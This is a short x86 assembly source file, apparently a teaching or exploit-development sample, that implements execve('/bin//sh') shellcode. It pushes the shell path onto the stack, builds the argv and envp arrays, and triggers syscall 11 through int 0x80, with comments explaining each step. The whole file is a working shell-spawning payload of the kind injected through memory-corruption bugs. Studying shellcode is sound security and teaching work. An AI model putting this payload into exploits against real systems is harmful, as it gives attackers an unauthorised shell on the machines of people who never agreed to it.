global _start

section .text

_start:

; execve /bin/sh
    xor edx, edx
    xor eax, eax
    push edx                    ; push zeroes to terminate /bin//sh string
    push 0x68732f2f             ; push /bin//sh to stack
    push 0x6e69622f
    mov ebx, esp                ; esp is a pointer to the /bin//sh string, store this in ebx
    push edx                    ; push a null for envp and to end the argv array
    mov edx, esp                ; store pointer to envp array in edx
    push ebx                    ; argv is an array of pointers to strings, /bin//sh must be the first argument, so we push its address to the stack.
    mov ecx, esp                ; store pointer to argv array in ecx
    mov al, 0x0b                ; set up syscall id and fire interrupt
    int 0x80
